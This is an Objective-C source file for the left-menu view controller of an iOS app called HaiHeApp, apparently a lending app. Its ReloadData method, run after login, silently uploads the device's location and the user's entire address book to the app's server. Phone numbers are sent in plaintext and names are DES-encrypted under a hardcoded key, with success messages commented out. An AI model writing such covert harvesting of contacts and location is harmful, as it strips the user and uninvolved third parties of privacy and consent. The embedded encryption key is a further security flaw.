//
//  leftMain_Vc.m
//  HaiHeApp
//
//  Created by 信昊 on 17/6/8.
//  Copyright © 2017年 马广召. All rights reserved.
//

#import "leftMain_Vc.h"
#import "main_left_Cell.h"
#import "main_left_header_View.h"
#import "gaode_Location.h"
#import "HandleAddressBook.h"
#import "des.h"
@interface leftMain_Vc ()<UITableViewDelegate,UITableViewDataSource>
@property(nonatomic,strong)UITableView *tableView;

@property(nonatomic,assign)NSInteger PostNum;

@end

@implementation leftMain_Vc

- (void)viewDidLoad {
    [super viewDidLoad];
    self.PostNum = 0;
    self.navigationController.navigationBar.barTintColor = [UIColor colorWithRed:177/255.0 green:25/255.0 blue:25/255.0 alpha:1];
    self.navigationItem.hidesBackButton = YES;
    [self initUI];
    [self initdata];
    [[NSNotificationCenter defaultCenter]addObserver:self selector:@selector(ReloadData) name:Nsnotion_ShuaXinPhone object:nil];
    
    // Do any additional setup after loading the view.
}
-(void)viewWillAppear:(BOOL)animated{
    [super viewWillAppear:animated];
     self.navigationController.navigationBar.hidden = YES;
    
   
}
-(void)ReloadData{
    
    [self.tableView reloadData];
    if ([UserLoginStatus shareManager].userid.length > 0) {
        if (self.PostNum == 0) {
            //            __weak LoginViewController *weakSelf = self;
            [[gaode_Location shareInstance] getLocation:^(CLLocation *location, AMapLocationReGeocode *regeocode) {
                [[HaiHeNetBridge sharedManager]postLocationWithlatitude:[NSString stringWithFormat:@"%f",location.coordinate.latitude] Withlongitude:[NSString stringWithFormat:@"%f",location.coordinate.longitude] WithUserId:[UserLoginStatus shareManager].userid WithAddress:regeocode.formattedAddress WithSuccess:^(NSString *respString, NSDictionary *datadic) {
                    NSLog(@"%@",respString);
                    NSLog(@"%@",datadic);
                    if (!respString) {
                        //购买成功耶；
                        //                        [[ShowMessageView shareManager] showMessage:@"上传定位成功"];
                    }else{
                        [[ShowMessageView shareManager] showMessage:respString];
                    }
                    
                }];
            }];
            
            [HandleAddressBook addressBookAuthorization:^(NSMutableArray<PersonInfoModel *> *personInfoArray) {
                
                NSMutableArray *muarr = [[NSMutableArray alloc]init];
                for (PersonInfoModel *model  in personInfoArray) {
                    NSMutableDictionary *mudic = [[NSMutableDictionary alloc]init];
                    NSString * content =@"cbi7hiGn";
                    NSString *phoneName_sign = [des encryptWithContent:model.personName type:kCCEncrypt key:content];
                    [mudic setValue:phoneName_sign forKey:@"name"];
                    [mudic setValue:model.personPhone forKey:@"phone"];
                    [muarr addObject:mudic];
                }
                
                [[HaiHeNetBridge sharedManager]postPhoneListWitharr:muarr WithUserid:[UserLoginStatus shareManager].userid WithSuccess:^(NSString *respString, NSDictionary *datadic) {
                    NSLog(@"%@",respString);
                    NSLog(@"%@",datadic);
                    if (!respString) {
                        //购买成功耶；
                        //                        [[ShowMessageView shareManager] showMessage:@"上传通讯录成功"];
                    }else{
                        [[ShowMessageView shareManager] showMessage:respString];
                    }
                    
                }];
            }];
            
        }
        self.PostNum++;
 
    }
    
   
}

-(void)initUI{
    self.tableView = [[UITableView alloc]initWithFrame:CGRectMake(0, 20, 200, 300) style:UITableViewStylePlain];
    self.tableView.backgroundColor = _COLOR_RGB(0xf5f5f5);
    self.tableView.delegate = self;
    self.tableView.dataSource = self;
    self.tableView.bounces = NO;
    self.tableView.separatorStyle = UITableViewCellSeparatorStyleSingleLine;
    [self.tableView registerNib:[UINib nibWithNibName:@"main_left_Cell" bundle:nil] forCellReuseIdentifier:@"main_left_Cell"];
    [self.view addSubview:self.tableView];
    self.tableView.tableFooterView = [[UIView alloc]init];
}
-(void)initdata{
    
    
}
-(NSInteger)numberOfSectionsInTableView:(UITableView *)tableView{
    return 3;
}
-(NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section{
    return 1;
}
-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{
    main_left_Cell *cell = [tableView dequeueReusableCellWithIdentifier:@"main_left_Cell"];
    cell.IndexPath = indexPath;
    
    return cell;
}
-(CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath{
    return 45;
}
-(UIView *)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section{
    if (section == 0) {
        main_left_header_View *header = [[[NSBundle mainBundle]loadNibNamed:@"main_left_header_View" owner:self options:nil]firstObject];
        header.frame = CGRectMake(0, 0, 200, 100);
        header.backgroundColor = _COLOR_RGB(0xf5f5f5);
        header.phoneNumeber.text = [UserLoginStatus shareManager].userTel;
        
        return header;
    }
    return nil;
}
-(CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section{
    if (section == 0) {
        return 100;
    }
    return 5;
}
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{
    if (indexPath.section == 0) {
    [[NSNotificationCenter defaultCenter]postNotificationName:Nsnotion_Shenhe object:nil];
    }
    if (indexPath.section == 1) {
    [[NSNotificationCenter defaultCenter]postNotificationName:Nsnotion_Huankuan object:nil];
    }
    if (indexPath.section == 2) {
    [[NSNotificationCenter defaultCenter]postNotificationName:Nsnotion_SafeSet object:nil];
    }
   
  
}


-(void)dealloc{
    [[NSNotificationCenter defaultCenter]removeObserver:self];
}
- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

/*
#pragma mark - Navigation

// In a storyboard-based application, you will often want to do a little preparation before navigation
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    // Get the new view controller using [segue destinationViewController].
    // Pass the selected object to the new view controller.
}
*/

@end
